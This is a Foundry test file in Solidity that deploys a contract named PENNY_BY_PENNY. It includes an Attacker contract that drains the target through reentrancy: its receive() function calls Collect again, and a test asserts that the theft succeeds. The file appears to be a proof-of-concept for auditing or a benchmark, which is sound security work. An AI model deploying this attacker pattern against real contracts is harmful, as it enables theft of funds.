
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY} from "../src/PENNY_BY_PENNY.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyPennyByPenny is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsCollectMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal);
        vm.deal(address(this), attackVal);

        vm.warp(1000);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PENNY_BY_PENNY(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        
        _victim.Collect(val);
        
        if (address(this).balance >= initialSnapshot + (storedAttackVal * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 3) {
            _victim.Collect(storedAttackVal);
        }
    }
}
